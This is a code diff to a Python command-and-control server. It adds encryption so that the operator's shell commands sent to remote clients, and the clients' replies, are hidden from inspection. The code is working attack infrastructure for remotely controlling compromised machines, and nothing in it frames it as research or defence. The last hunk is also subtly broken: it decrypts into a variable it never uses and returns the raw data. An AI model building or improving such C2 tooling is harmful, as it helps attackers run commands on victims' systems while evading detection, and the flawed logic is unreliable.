@@ -4,6 +4,7 @@ from http import server
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import unquote_plus
 from inputimeout import inputimeout, TimeoutOccurred
+from encryption import cipher
 from settings import CWD_RESPONSE, PORT, CMD_REQUEST, INPUT_TIMEOUT, KEEP_ALIVE_CMD, RESPONSE, RESPONSE_KEY, BIND_ADDR
 
 def get_new_session():
@@ -61,6 +62,9 @@ class C2Handler(BaseHTTPRequestHandler):
             # Split out the client account name
             client = self.path.split(CMD_REQUEST)[1]
 
+            # Encode the client data because decrypt requires it, then decrypt, then decode
+            client = cipher.decrypt(client.encode()).decode()
+
             # Split out the client account name
             client_account = client.split("@")[0]
 
@@ -99,10 +103,10 @@ class C2Handler(BaseHTTPRequestHandler):
                     # Collect the command to run on the client; set Linux style promt as well
                     command = input(f"{client_account}@{client_hostname}:{cwd}$ ")
 
-                # Write the command back to the client as a response; must utf-8 encode
+                # Write the command back to the client as a response; must utf-8 encode and encrypt
                 try:
                     self.http_response(200)
-                    self.wfile.write(command.encode())
+                    self.wfile.write(cipher.encrypt(command.encode()))
 
                 # If an exception occurs, notify and remove the active session from the dictionary
                 except BrokenPipeError:
@@ -155,8 +159,14 @@ class C2Handler(BaseHTTPRequestHandler):
     
         # Remove the HTTP POST variable and the equal sign from the client's data
         client_data = client_data.replace(f"{RESPONSE_KEY}=", "", 1)
+
         # HTML/URL decode the client's data and translate "+" to a space
         client_data = unquote_plus(client_data)
+
+        # Encode the client data because decrypt requires it, then decrypt, then decode
+        client = cipher.decrypt(client_data.encode()).decode()
+
+        # Return the processed client's data
         return client_data
 
     def http_response(self, code: int):
